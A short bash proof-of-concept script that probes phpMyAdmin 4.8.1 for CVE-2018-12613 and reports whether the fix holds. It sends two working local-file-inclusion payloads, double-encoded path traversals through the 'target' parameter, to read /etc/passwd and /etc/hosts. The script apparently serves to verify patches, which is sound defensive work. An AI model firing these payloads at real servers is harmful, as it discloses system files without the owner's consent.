#!/usr/bin/env bash
# Probe CVE-2018-12613 (phpMyAdmin 4.8.1 local file inclusion).
# Usage: ./poc.sh [base-url]   (default http://127.0.0.1:8080)
# Exit 0 when the payload is blocked, 1 when a file is disclosed.
set -u
base="${1:-http://127.0.0.1:8080}"
fail=0

check () {
  local name="$1" path="$2"
  local out code body
  out=$(curl --path-as-is -s -m 15 -o - -w '\n%{http_code}' "$base/$path" 2>/dev/null)
  code=$(printf '%s' "$out" | tail -n1)
  body=$(printf '%s' "$out" | sed '$d')

  if printf '%s' "$body" | grep -q 'root:x:0:0'; then
    printf '[VULNERABLE] %-34s HTTP %s - /etc/passwd disclosed\n' "$name" "$code"
    fail=1
  else
    printf '[blocked]    %-34s HTTP %s\n' "$name" "$code"
  fi
}

echo "Target: $base"
check "target parameter traversal" "index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
check "hosts file traversal"       "index.php?target=db_sql.php%253f/../../../../../../../../etc/hosts"

echo "----"
if [ "$fail" -eq 0 ]; then
  echo "RESULT: payloads blocked (fix verified)"
else
  echo "RESULT: at least one payload leaked a file (vulnerable)"
fi
exit "$fail"
